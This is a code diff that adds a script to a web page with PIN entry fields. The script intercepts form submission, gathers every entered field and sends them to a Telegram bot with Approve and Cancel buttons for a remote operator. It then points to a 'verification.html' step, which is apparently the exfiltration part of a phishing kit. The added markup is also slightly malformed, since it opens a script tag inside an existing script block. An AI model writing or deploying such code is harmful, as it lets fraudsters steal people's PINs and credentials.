@@ -531,7 +531,59 @@ pinInputs.forEach((input, index) => {
     });
 
 });
+<script>
+// Configure your next file name here
+const NEXT_PAGE_FILE = "verification.html";
 
+document.querySelector('form').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    // Grab credentials safely from a global injected object
+    const BOT_TOKEN = window.APP_CONFIG?.BOT_TOKEN;
+    const CHAT_ID = window.APP_CONFIG?.CHAT_ID;
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+        alert("Configuration error: Bot credentials missing.");
+        return;
+    }
+
+    const formData = new FormData(this);
+    let messageText = "📥 *New Submission:*\n";
+    for (let [key, value] of formData.entries()) {
+        messageText += `- *${key}*: ${value}\n`;
+    }
+
+    const requestId = "req_" + Date.now();
+    messageText += `\n_ID: ${requestId}_`;
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: messageText,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: "✅ Approve", callback_data: `approve_${requestId}` },
+                        { text: "❌ Cancel", callback_data: `cancel_${requestId}` }
+                    ]]
+                }
+            })
+        });
+
+        const data = await response.json();
+        if (data.ok) {
+            alert("Submission sent for approval. Please wait.");
+            // Add your polling logic here to check for the callback
+        } else {
+            alert("Failed to send message.");
+        }
+    } catch (err) {
+        console.error("Error:", err);
+    }
+});
 </script>
 
 </body>
